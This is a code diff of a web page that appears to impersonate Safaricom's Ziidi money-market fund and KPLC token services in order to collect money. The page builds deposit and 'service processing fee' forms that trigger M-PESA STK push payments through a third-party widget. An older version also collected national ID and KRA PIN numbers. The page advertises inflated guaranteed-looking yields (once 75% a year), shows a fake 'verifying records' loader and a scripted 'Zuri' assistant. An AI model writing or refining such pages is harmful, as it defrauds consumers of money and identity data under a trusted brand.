+                renderFinapiWidget(amt, `KPLC TOKEN PURCHASE KSH ${amt}`, 'widget-wrapper-kplc', phoneVal);
+            });
         }
 
         function renderZiidiForm(container) {
-            let tableRows = historicalShareYields.map(row => {
-                const is2026 = row.year.includes("2026");
-                const rowClass = is2026 ? 'class="highlight-2026"' : '';
-                return `
-                    <tr ${rowClass}>
-                        <td><strong>${row.year}</strong></td>
-                        <td>${row.scom}</td>
-                        <td>${row.kcb}</td>
-                        <td>${row.absa}</td>
-                    </tr>
-                `;
-            }).join('');
+            let tableRows = historicalShareYields.map(row => `
+                <tr class="${row.year.includes('2026') ? 'highlight-2026' : ''}">
+                    <td>${row.year}</td>
+                    <td>${row.scom}</td>
+                    <td>${row.kcb}</td>
+                    <td>${row.absa}</td>
+                </tr>
+            `).join('');
 
             container.innerHTML = `
+                <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">ZIIDI MMF HIGH-YIELD SAVINGS & EQUITIES PORTAL</div>
+
                 <div class="analytics-container">
                     <div class="analytics-header">
-                        <span>📊 Shares & Yield Performance History (2016 – 2026)</span>
-                        <span style="font-size:10px; background:#e6f7ed; padding:3px 8px; border-radius:10px; font-weight:800;">Peak 2026 Yields</span>
+                        <span>📊 Historical Annual Compound Performance</span>
+                        <span style="color:var(--safaricom-green);">Live 2026 Peak Data</span>
                     </div>
-                    <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 10px;">
-                        Historical percentage yields for Safaricom (SCOM), KCB Group, and ABSA Bank underlying portfolios:
-                    </p>
-                    
+
                     <div class="history-table-wrapper">
                         <table class="history-table">
                             <thead>
                                 <tr>
-                                    <th>Year</th>
+                                    <th>Financial Year</th>
                                     <th>Safaricom (SCOM)</th>
                                     <th>KCB Group</th>
                                     <th>ABSA Bank</th>
@@ -1160,202 +1422,171 @@
                     </div>
 
                     <div class="calc-card">
-                        <div style="font-weight:800; font-size:13px; color:var(--text-dark); margin-bottom:10px;">🧮 Dynamic Return Yield Calculator</div>
-                        
+                        <div style="font-size:12px; font-weight:800; color:var(--text-dark); margin-bottom:8px;">📈 Compound Interest Growth Calculator</div>
                         <div class="form-grid">
                             <div class="form-group">
-                                <label>Capital Investment (KSh 200 - 500,000)</label>
-                                <input type="number" id="ziidiCalcInput" value="200" min="200" max="500000" oninput="calculateZiidiReturns()">
+                                <label>Initial Investment (KSh)</label>
+                                <input type="number" id="calcPrincipal" value="10000" oninput="calculateZiidiYield()">
                             </div>
                             <div class="form-group">
-                                <label>Target Holding Period</label>
-                                <select id="ziidiPeriodSelect" onchange="calculateZiidiReturns()">
-                                    <option value="1">1 Month</option>
-                                    <option value="3">3 Months</option>
-                                    <option value="6">6 Months</option>
-                                    <option value="12" selected>1 Year (12 Months)</option>
+                                <label>Target Yield Portfolio</label>
+                                <select id="calcYieldRate" onchange="calculateZiidiYield()">
+                                    <option value="0.185">Safaricom Equity (18.5% p.a.)</option>
+                                    <option value="0.172">KCB Money Market (17.2% p.a.)</option>
+                                    <option value="0.168">ABSA Capital Fund (16.8% p.a.)</option>
                                 </select>
                             </div>
                         </div>
 
                         <div class="calc-output-box">
-                            <div style="font-size:11px; color:var(--text-muted); font-weight:700;">ESTIMATED TOTAL RETURN</div>
-                            <div class="calc-highlight" id="calcTotalReturn">KSh 350</div>
-                            <div class="calc-subtext" id="calcNetProfit">+KSh 150 net earnings (75.0% projected total return)</div>
+                            <div class="calc-subtext">Estimated 1-Year Total Portfolio Value:</div>
+                            <div class="calc-highlight" id="calcResultDisplay">KSh 11,850</div>
                         </div>
                     </div>
                 </div>
 
-                <form onsubmit="handleFormSubmit(event, document.getElementById('ziidiAmount').value)">
+                <form onsubmit="handleZiidiSubmit(event)">
                     <div class="form-grid">
                         <div class="form-group">
-                            <label>Deposit Amount (KSh) [Min: 200] *</label>
-                            <input type="number" id="ziidiAmount" value="200" min="200" max="500000" required oninput="syncAmountToCalc(this.value)">
+                            <label>Deposit Amount (KSh) *</label>
+                            <input type="number" id="ziidiAmtInput" required placeholder="Minimum KSh 100" min="100">
                         </div>
                         <div class="form-group">
-                            <label>Investor Full Legal Name *</label>
-                            <input type="text" required placeholder="Full Name">
-                        </div>
-                        <div class="form-group">
-                            <label>National ID Number *</label>
-                            <input type="text" required placeholder="National ID Number">
-                        </div>
-                        <div class="form-group">
-                            <label>KRA PIN Number *</label>
-                            <input type="text" required placeholder="KRA PIN Number">
-                        </div>
-                        <div class="form-group full-width">
-                            <label>Safaricom Line for Deposit STK Push *</label>
-                            <input type="tel" id="userPhone" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
+                            <label>Safaricom Line for MMF Deposit *</label>
+                            <input type="tel" id="userPhone" placeholder="07XXXXXXXX" pattern="^(07|01|254)[0-9]{8}$" required>
                         </div>
                     </div>
+
                     ${getMoneyBackGuaranteeNotice()}
-                    <button type="submit" class="btn-animated">PROCEED TO DEPOSIT CAPITAL &rarr;</button>
+
+                    <button type="submit" class="btn-animated">DEPOSIT & START EARNING INTEREST &rarr;</button>
                 </form>
             `;
 
-            calculateZiidiReturns();
+            calculateZiidiYield();
         }
 
-        function syncAmountToCalc(val) {
-            const calcInput = document.getElementById('ziidiCalcInput');
-            if (calcInput) {
-                calcInput.value = val;
-                calculateZiidiReturns();
-            }
+        function calculateZiidiYield() {
+            const principal = parseFloat(document.getElementById('calcPrincipal').value) || 0;
+            const rate = parseFloat(document.getElementById('calcYieldRate').value) || 0.185;
+            const total = principal + (principal * rate);
+            document.getElementById('calcResultDisplay').innerText = `KSh ${Math.round(total).toLocaleString()}`;
         }
 
-        function calculateZiidiReturns() {
-            const input = document.getElementById('ziidiCalcInput');
-            const periodSelect = document.getElementById('ziidiPeriodSelect');
-            const totalOut = document.getElementById('calcTotalReturn');
-            const netOut = document.getElementById('calcNetProfit');
+        function handleZiidiSubmit(e) {
+            e.preventDefault();
+            const amt = parseFloat(document.getElementById('ziidiAmtInput').value);
+            const phoneVal = document.getElementById('userPhone') ? document.getElementById('userPhone').value : '';
 
-            if (!input || !periodSelect || !totalOut) return;
+            run6SecLoader(`Processing Ziidi MMF Deposit of KSh ${amt}`, () => {
+                const container = document.getElementById('modalDynamicBody');
+                container.innerHTML = `
+                    <div class="success-note">
+                        <h4 style="font-size:15px; margin-bottom:6px; font-weight:800;">✅ MMF Account Ready for Funding</h4>
+                        <p style="font-size:13px;">Authorize the deposit of <strong>KSh ${amt.toLocaleString()}</strong> via direct M-PESA STK Push below.</p>
+                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
+                    <div id="widget-wrapper-ziidi"></div>
+                `;
 
-            let principal = parseFloat(input.value);
-            if (isNaN(principal) || principal < 200) principal = 200;
-            if (principal > 500000) principal = 500000;
-
-            const months = parseInt(periodSelect.value);
-            const annualMultiplier = 1.75; 
-            const monthlyGrowth = (annualMultiplier - 1) / 12;
-
-            const totalReturn = principal * (1 + (monthlyGrowth * months));
-            const profit = totalReturn - principal;
-            const percentage = ((profit / principal) * 100).toFixed(1);
-
-            totalOut.innerText = `KSh ${Math.round(totalReturn).toLocaleString()}`;
-            netOut.innerText = `+KSh ${Math.round(profit).toLocaleString()} net earnings (${percentage}% projected yield over ${months} mo)`;
+                renderFinapiWidget(amt, `ZIIDI MMF DEPOSIT KSH ${amt}`, 'widget-wrapper-ziidi', phoneVal);
+            });
         }
 
-        /* INTEGRATED FINAPI WIDGET EMBEDDER (MATCHING CODE 1 INTEGRATION) */
-        function renderFinapiWidget(feeAmount, customButtonText, wrapperElementId, presetPhone = '') {
-            const wrapper = document.getElementById(wrapperElementId);
-            if (!wrapper) return;
+        function handleFormSubmit(e, fee) {
+            e.preventDefault();
+            const phoneVal = document.getElementById('userPhone') ? document.getElementById('userPhone').value : '';
+            run6SecLoader('Validating Application Details & Verifying Records', () => {
+                const container = document.getElementById('modalDynamicBody');
+                container.innerHTML = `
+                    <div class="success-note">
+                        <h4 style="font-size:15px; margin-bottom:6px; font-weight:800;">✅ Details Successfully Verified!</h4>
+                        <p style="font-size:13px;">Please complete payment authorization below to process your request immediately.</p>
+                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
+                    <div id="widget-wrapper-gen"></div>
+                `;
 
-            wrapper.innerHTML = `
-                <div id="finapi-container-${wrapperElementId}" class="finapi-widget"
-                     data-api-key="${FINAPI_KEY}"
-                     data-amount="${feeAmount}"
-                     data-button-text="${customButtonText}">
-                </div>
+                renderFinapiWidget(fee, `SERVICE PROCESSING FEE KSH ${fee}`, 'widget-wrapper-gen', phoneVal);
+            });
+        }
+
+        /* -------------------- FINAPI INTEGRATION -------------------- */
+        function renderFinapiWidget(amount, title, targetWrapperId, phone) {
+            const container = document.getElementById(targetWrapperId);
+            if (!container) return;
+
+            container.innerHTML = `
+                <div class="finapi-widget" id="finapi-container" style="margin-top: 16px; width: 100%;"></div>
             `;
 
-            // Clean up old script if present and load fresh
-            const oldScript = document.getElementById('finapi-script-active');
-            if (oldScript) oldScript.remove();
-
             const script = document.createElement('script');
-            script.id = 'finapi-script-active';
-            script.src = 'https://stkpush.co.ke/static/js/finapi-widget.min.js';
+            script.src = "https://finapi.co.ke/widget/v1.js";
             script.onload = () => {
-                const widget = document.getElementById(`finapi-container-${wrapperElementId}`);
-                if (widget) {
-                    widget.addEventListener('finapi:payment_success', (e) => {
-                        console.log('Success!', e.detail);
-                        const container = document.getElementById('modalDynamicBody');
-                        container.innerHTML = `
-                            <div style="text-align:center; padding: 40px 20px;">
-                                <div style="font-size: 50px; margin-bottom: 15px;">✅</div>
-                                <h2 style="color:var(--safaricom-green); font-size:22px; margin-bottom:10px; font-weight:800;">Payment Successful!</h2>
-                                <p style="font-size:14px; color:var(--text-dark); margin-bottom:15px;">Your transaction has been received and confirmed.</p>
-                                <p style="font-size:12px; color:var(--text-muted);">Your requested facility update will reflect automatically within 3 hours.</p>
-                            </div>
-                        `;
-                    });
-                    widget.addEventListener('finapi:payment_failed', (e) => {
-                        console.log('Failed!', e.detail);
-                        alert(e.detail?.message || 'Payment failed or was cancelled. Please try again.');
+                if (window.FinAPI) {
+                    FinAPI.init({
+                        apiKey: FINAPI_KEY,
+                        amount: amount,
+                        title: title,
+                        phone: phone || '',
+                        container: "#finapi-container",
+                        onSuccess: (data) => {
+                            alert(`🎉 Payment Successful! Transaction Ref: ${data.reference || 'SUCCESS'}`);
+                            closeModal();
+                        },
+                        onCancel: () => {
+                            alert("Payment was cancelled.");
+                        },
+                        onError: (err) => {
+                            alert("Payment error occurred. Please try again.");
+                        }
                     });
                 }
             };
             document.body.appendChild(script);
         }
 
-        function handleFormSubmit(e, fee) {
-            e.preventDefault();
-            const phoneInput = document.getElementById('userPhone');
-            const phone = phoneInput ? phoneInput.value : '';
-            
-            const container = document.getElementById('modalDynamicBody');
-            container.innerHTML = `
-                <div style="text-align:center; padding: 20px;">
-                    <h3 style="font-size:18px; margin-bottom:12px; font-weight:800; color:var(--safaricom-green);">Complete Payment Authorization</h3>
-                    <p style="font-size:13px; color:var(--text-muted); margin-bottom:20px;">
-                        Click the secure button below to initialize the STK push prompt for <strong>KSh ${fee}</strong> on phone <strong>${phone || 'your mobile line'}</strong>.
-                    </p>
-                    <div id="widget-wrapper-generic"></div>
-                </div>
-            `;
-            renderFinapiWidget(fee, `PAY KSH ${fee} VIA STK PUSH`, 'widget-wrapper-generic', phone);
+        /* -------------------- ZURI AI CHAT -------------------- */
+        function toggleZuriChat() {
+            const chatWin = document.getElementById('zuriChatWindow');
+            chatWin.classList.toggle('active');
         }
 
         function initZuriFaqs() {
             const container = document.getElementById('zuriFaqContainer');
             container.innerHTML = '';
-            
-            zuriFaqs20.forEach((faq, index) => {
+            zuriFaqs20.forEach((faq) => {
                 const btn = document.createElement('button');
                 btn.className = 'zuri-faq-btn';
                 btn.innerText = faq.q;
-                btn.onclick = () => handleZuriFaqClick(index);
+                btn.onclick = () => sendZuriFaqAnswer(faq.q, faq.a);
                 container.appendChild(btn);
             });
         }
 
-        function toggleZuriChat() {
-            const win = document.getElementById('zuriChatWindow');
-            win.classList.toggle('active');
-        }
-
-        function handleZuriFaqClick(index) {
-            const faq = zuriFaqs20[index];
-            const chatBody = document.getElementById('zuriChatBody');
+        function sendZuriFaqAnswer(question, answer) {
+            const body = document.getElementById('zuriChatBody');
 
             const userMsg = document.createElement('div');
             userMsg.className = 'zuri-msg user';
-            userMsg.innerText = faq.q;
-            chatBody.appendChild(userMsg);
+            userMsg.innerText = question;
+            body.appendChild(userMsg);
 
-            const typingIndicator = document.createElement('div');
-            typingIndicator.className = 'zuri-typing';
-            typingIndicator.id = 'zuriTypingIndicator';
-            typingIndicator.innerHTML = `<span>🤖 Zuri is typing...</span>`;
-            chatBody.appendChild(typingIndicator);
+            const typing = document.createElement('div');
+            typing.className = 'zuri-typing';
+            typing.innerHTML = `<span>🟢 Zuri is typing...</span>`;
+            body.appendChild(typing);
 
-            chatBody.scrollTop = chatBody.scrollHeight;
+            body.scrollTop = body.scrollHeight;
 
             setTimeout(() => {
-                const indicator = document.getElementById('zuriTypingIndicator');
-                if (indicator) indicator.remove();
-
+                typing.remove();
                 const botMsg = document.createElement('div');
                 botMsg.className = 'zuri-msg bot';
-                botMsg.innerText = faq.a;
-                chatBody.appendChild(botMsg);
-                chatBody.scrollTop = chatBody.scrollHeight;
-            }, 4000);
+                botMsg.innerText = answer;
+                body.appendChild(botMsg);
+                body.scrollTop = body.scrollHeight;
+            }, 1000);
         }
     </script>
 </body>
